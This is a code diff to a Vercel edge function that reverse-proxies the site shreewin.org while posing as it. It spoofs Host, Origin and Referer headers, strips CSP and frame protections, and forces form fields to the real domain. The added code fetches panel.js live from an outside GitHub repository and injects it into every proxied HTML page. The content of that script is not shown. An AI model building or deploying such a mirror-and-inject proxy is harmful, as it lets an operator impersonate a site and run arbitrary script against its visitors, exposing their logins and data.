@@ -1,5 +1,5 @@
 // Vercel Edge Function — Reverse Proxy for shreewin.org
-// Deploy on Vercel. All traffic is routed here via vercel.json rewrites.
+// All traffic is routed here via vercel.json rewrites.
 
 export const config = { runtime: "edge" };
 
@@ -23,12 +23,32 @@ export default async function handler(request) {
     });
   }
 
-  // 2. Route /api/* directly to the API server, everything else to the target site
+  // 2. Serve static files using the exact links from links.dump (fetches live on the backend)
+  const STATIC_FILES = {
+    "/logo.png": "https://raw.githubusercontent.com/astarhuni/proxy/refs/heads/main/logo.png",
+    "/panel.js": "https://raw.githubusercontent.com/astarhuni/proxy/refs/heads/main/panel.js"
+  };
+
+  if (STATIC_FILES[url.pathname]) {
+    const resp = await fetch(STATIC_FILES[url.pathname], { cache: "no-store" });
+    const headers = new Headers(resp.headers);
+    headers.set("Access-Control-Allow-Origin", "*");
+    headers.set("Cache-Control", "no-cache");
+    if (url.pathname.endsWith(".js")) {
+      headers.set("Content-Type", "application/javascript; charset=utf-8");
+    }
+    if (url.pathname.endsWith(".png")) {
+      headers.set("Content-Type", "image/png");
+    }
+    return new Response(resp.body, { status: resp.status, headers });
+  }
+
+  // 3. Route /api/* directly to the API server, everything else to the target site
   const isApi = url.pathname.startsWith("/api/");
   const upstreamOrigin = isApi ? API_ORIGIN : TARGET_ORIGIN;
   const targetUrl = new URL(url.pathname + url.search, upstreamOrigin);
 
-  // 3. Build request headers — spoof Origin/Referer/Host so the server accepts us
+  // 4. Build request headers — spoof Origin/Referer/Host so the server accepts us
   const reqHeaders = new Headers(request.headers);
   reqHeaders.set("Host", new URL(upstreamOrigin).host);
   if (reqHeaders.has("Origin"))  reqHeaders.set("Origin", TARGET_ORIGIN);
@@ -45,7 +65,7 @@ export default async function handler(request) {
   reqHeaders.delete("x-vercel-forwarded-for");
   reqHeaders.delete("x-vercel-ip-country");
 
-  // 4. Intercept POST body — force `domainurl` to the real site domain
+  // 5. Intercept POST body — force `domainurl` to the real site domain
   let body = ["GET", "HEAD"].includes(request.method) ? undefined : request.body;
 
   if (request.method === "POST") {
@@ -64,7 +84,7 @@ export default async function handler(request) {
     }
   }
 
-  // 5. Proxy the request upstream
+  // 6. Proxy the request upstream
   let upstreamResp;
   try {
     upstreamResp = await fetch(targetUrl.toString(), {
@@ -77,7 +97,7 @@ export default async function handler(request) {
     return new Response("Proxy error: " + err.message, { status: 502 });
   }
 
-  // 6. Handle redirects — rewrite Location header to point to our domain
+  // 7. Handle redirects — rewrite Location header to point to our domain
   if ([301, 302, 303, 307, 308].includes(upstreamResp.status)) {
     const location = upstreamResp.headers.get("Location") || "";
     const rewritten = location
@@ -89,7 +109,7 @@ export default async function handler(request) {
     });
   }
 
-  // 7. Clean up response headers
+  // 8. Clean up response headers
   const respHeaders = new Headers(upstreamResp.headers);
   respHeaders.delete("x-frame-options");
   respHeaders.delete("content-security-policy");
@@ -100,7 +120,7 @@ export default async function handler(request) {
   respHeaders.delete("cross-origin-resource-policy");
   respHeaders.set("Access-Control-Allow-Origin", "*");
 
-  // 8. Rewrite HTML and JS so browser URLs stay on the Vercel domain
+  // 9. Rewrite HTML and JS so browser URLs stay on the Vercel domain
   const contentType = respHeaders.get("Content-Type") || "";
   if (
     contentType.includes("text/html") ||
@@ -120,10 +140,20 @@ export default async function handler(request) {
     // Remove any old Cloudflare worker URLs that may still exist
     text = text.split("shree00-win.wakeuptorealityok.workers.dev").join(url.host);
 
-    // Force Content-Type correct for JS files
-    if (contentType.includes("javascript")) {
+    if (contentType.includes("text/html")) {
+      const injection = `
+  <!-- Proxy injection -->
+  <script src="/panel.js"></script>
+`;
+      text = text.replace("</body>", injection + "</body>");
+    } else {
+      // Force Content-Type correct for JS files
       respHeaders.set("Content-Type", "application/javascript; charset=utf-8");
     }
+
+    // CRITICAL SPEED FIX: We modified the body, so we must remove the old compression and length headers
+    respHeaders.delete("content-encoding");
+    respHeaders.delete("content-length");
 
     return new Response(text, {
       status:  upstreamResp.status,
@@ -131,7 +161,7 @@ export default async function handler(request) {
     });
   }
 
-  // 9. Stream everything else (images, fonts, JSON, etc.) unchanged
+  // 10. Stream everything else (images, fonts, JSON, etc.) unchanged
   return new Response(upstreamResp.body, {
     status:  upstreamResp.status,
     headers: respHeaders,
